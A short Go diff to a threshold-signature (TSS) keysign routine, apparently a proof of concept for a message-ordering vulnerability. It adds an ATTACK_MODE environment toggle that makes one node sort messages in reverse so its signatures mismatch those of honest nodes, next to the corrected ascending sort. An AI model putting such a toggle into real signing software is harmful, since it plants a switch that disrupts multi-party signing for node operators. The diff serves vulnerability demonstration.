@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"math/big"
+	"os"
 	"sort"
 	"sync"
 	"time"
@@ -187,9 +188,23 @@ func (s *KeySign) processKeySignTasks() {
 				// send no more than maxKeysignPerRequest messages in a single TSS keysign request
 				if totalTasks > maxKeysignPerRequest {
 					totalTasks = maxKeysignPerRequest
-					// when there are more than maxKeysignPerRequest messages in the task queue need to be signed
-					// the messages has to be sorted , because the order of messages that get into the slice is not deterministic
-					// so it need to sorted to make sure all bifrosts send the same messages to tss
+				}
+
+				// PoC: ATTACK_MODE toggle for demonstrating signature ordering vulnerability
+				// ATTACK_MODE=true: ATTACK behavior (inverted/descending sort) to guarantee ordering mismatch
+				// ATTACK_MODE=false/unset: FIXED behavior (ascending sort) - deterministic ordering
+				attackMode := os.Getenv("ATTACK_MODE") == "true"
+
+				if attackMode {
+					// ATTACK BEHAVIOR: Sort in DESCENDING order (inverted)
+					// This guarantees different ordering than honest nodes (which sort ascending)
+					// When 3 nodes use ascending and 1 uses descending, signatures will mismatch
+					sort.SliceStable(v, func(i, j int) bool {
+						return v[i].Msg > v[j].Msg // NOTE: > instead of < (descending)
+					})
+				} else {
+					// FIXED BEHAVIOR: Sort in ASCENDING order (deterministic)
+					// All honest nodes use this to ensure same message ordering
 					sort.SliceStable(v, func(i, j int) bool {
 						return v[i].Msg < v[j].Msg
 					})
